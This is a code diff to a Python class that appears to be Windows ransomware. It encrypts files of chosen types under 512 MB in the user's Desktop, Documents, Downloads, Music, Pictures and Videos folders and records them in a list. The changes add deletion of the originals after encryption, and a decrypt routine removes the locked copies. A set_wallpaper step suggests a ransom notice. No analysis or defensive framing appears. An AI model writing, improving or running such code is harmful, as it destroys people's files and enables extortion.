@@ -59,9 +59,13 @@ class Main(Base.Base):
       raise Exception("A list of encrypted files was not found at: %s" % self.encrypted_file_list)
 
     # Decrypt!
-    for x in file_list:
-      print("Decrypting {}".format(x))
-      self.Crypt.decrypt_file(x.rstrip())
+    for encrypted_file in file_list:
+      print("Decrypting {}".format(encrypted_file.rstrip()))
+
+      # IF successful decryption, delete locked file
+      locked_path = self.Crypt.decrypt_file(encrypted_file.rstrip())
+      if locked_path:
+        os.remove(locked_path)
 
     # Remove encrypted file list
     os.remove(self.encrypted_file_list)
@@ -72,30 +76,34 @@ class Main(Base.Base):
     encrypted_files = []
 
     # Encrypt them and add to list if successful
-    for x in file_list:
+    for file in file_list:
 
       # Encrypt file if less than specified file size
-      if int(os.path.getsize(x)) < 536870912:
-        status = self.Crypt.encrypt_file(x)
+      if int(os.path.getsize(file)) < self.MAX_FILE_SIZE_BYTES:
+         is_encrypted = self.Crypt.encrypt_file(file)
       else:
-        status = False
+        is_encrypted = False
 
-      # Check status of file
-      if status:
-        encrypted_files.append(x)
+      # IF encrypted, try to delete the file and add to the list
+      if is_encrypted:
+        try:
+          os.remove(file)
+        except:
+          continue
+        encrypted_files.append(file)
 
     # Write out list of encrypted files
     if encrypted_files:
       fh = open(self.encrypted_file_list, "w")
-      for x in encrypted_files:
-        fh.write(x)
+      for encrypted_file in encrypted_files:
+        fh.write(encrypted_file)
         fh.write("\n")
       fh.close()
 
 
   def find_files(self):
     # Function to find the relevant files to encrypt and return a list
-    base_dirs = self.get_base_dirs()
+    base_dirs = self.get_base_dirs(os.environ['USERPROFILE'])
     file_list = []
 
     for directory in base_dirs:
@@ -126,30 +134,10 @@ class Main(Base.Base):
 
     # Get extension and check if valid
     extension = components[-1]
-    if extension in self.filetypes:
+    if extension in self.FILETYPES:
       return True
     else:
       return False
-
-
-  def get_base_dirs(self):
-    # Function to return a list of base directories form which to start the encryption/decryption process
-
-    # Get user details
-    home_dir = os.environ['USERPROFILE']
-
-    # Create base_dirs list
-    base_dirs = [ os.path.join(home_dir, "Desktop"),
-                  os.path.join(home_dir, "Documents"),
-                  os.path.join(home_dir, "Downloads"),
-                  os.path.join(home_dir, "Music"),
-                  os.path.join(home_dir, "Pictures"),
-                  os.path.join(home_dir, "Videos")
-                  ]
-
-    #base_dirs = [ "C:\\Users\\Sithis\\development\\Ransom\\test" ]
-
-    return base_dirs
 
 
   def set_wallpaper(self):
